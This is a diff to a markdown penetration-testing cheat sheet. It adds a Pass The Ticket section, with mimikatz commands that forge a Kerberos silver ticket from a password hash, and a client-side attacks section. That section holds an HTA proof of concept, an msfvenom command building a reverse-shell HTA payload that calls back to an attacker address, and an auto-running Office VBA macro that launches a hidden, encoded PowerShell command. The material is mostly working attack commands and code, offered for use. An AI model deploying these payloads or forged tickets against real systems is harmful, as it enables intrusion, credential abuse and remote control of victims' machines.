@@ -40,6 +40,7 @@
 37. [Web Application Attacks](#Web-Application-Attacks)
 38. [AV Evasion](#AV-Evasion)
 39. [Port Redirection and Tunneling](#Port-Redirection-and-Tunneling)
+40. [Client Side Attacks](#Client-Side-Attacks)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -1005,6 +1006,22 @@ Alternative: [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
 ```
 pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.10.22 cmd
 ```
+
+## Pass The Ticket
+Example SID:
+```
+  S-1-5-21-2536614405-3629634762-1218571035-1116
+  \_______________________________________/\___/
+  S-<Revision Level>-<Identifier-Authority>-<Relative Identifier>
+```
+Use mimikatz to create a silver ticket.
+To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
+```
+mimikatz # kerberos::purge
+mimikatz # kerberos::list
+mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-1602875587-2787523311-2599479668 /target:ServicePrincipalName /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+```
+where /rc4 is the hash
 
 ## Shell Access Whith NTLM Hash
 
@@ -2615,7 +2632,70 @@ htc --forward-port 8080 10.10.10.10:4444
 
 
 
+# Client Side Attacks
+## Windows
+### HTML Applications
+If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program
 
+POC: 
+```
+<html>
+<body>
 
+<script>
+
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+  
+</script>
+
+</body>
+</html>
+```
+Craft payload
+```
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
+```
+
+### Exploiting Microsoft Office
+Since VBA has a 255-character limit for literal strings we need to split the command we want to execute into multiple lines
+```
+str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+```
+VBA macro:
+```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
+    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
+    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
+    ...
+    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
+    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
+    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
+    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
+    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+    Str = Str + "QA="
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
 
 
